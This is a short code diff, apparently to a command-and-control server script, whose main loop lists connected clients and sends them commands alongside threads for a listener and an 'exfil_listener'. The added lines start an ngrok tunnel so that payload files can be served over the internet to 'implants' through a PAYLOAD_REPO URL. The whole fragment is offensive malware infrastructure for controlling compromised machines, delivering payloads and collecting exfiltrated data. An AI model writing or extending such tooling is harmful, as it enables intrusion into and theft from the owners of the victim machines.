@@ -148,6 +148,18 @@ def show_clients():
 threading.Thread(target=listener, daemon=True).start()
 threading.Thread(target=exfil_listener, daemon=True).start()
 
+# Start ngrok for payload delivery
+try:
+    import requests
+    ngrok_url = start_ngrok(port=8000)
+    if ngrok_url:
+        print(f"[NGROK] Payloads available at: {ngrok_url}/<filename>")
+        print(f"[NGROK] Example for implant: PAYLOAD_REPO = '{ngrok_url}/'")
+    else:
+        print("[!] Ngrok tunnel not found. Falling back to local IP.")
+except Exception as e:
+    print(f"[!] Ngrok startup failed: {e}")
+
 while True:
     show_clients()
     send_command()
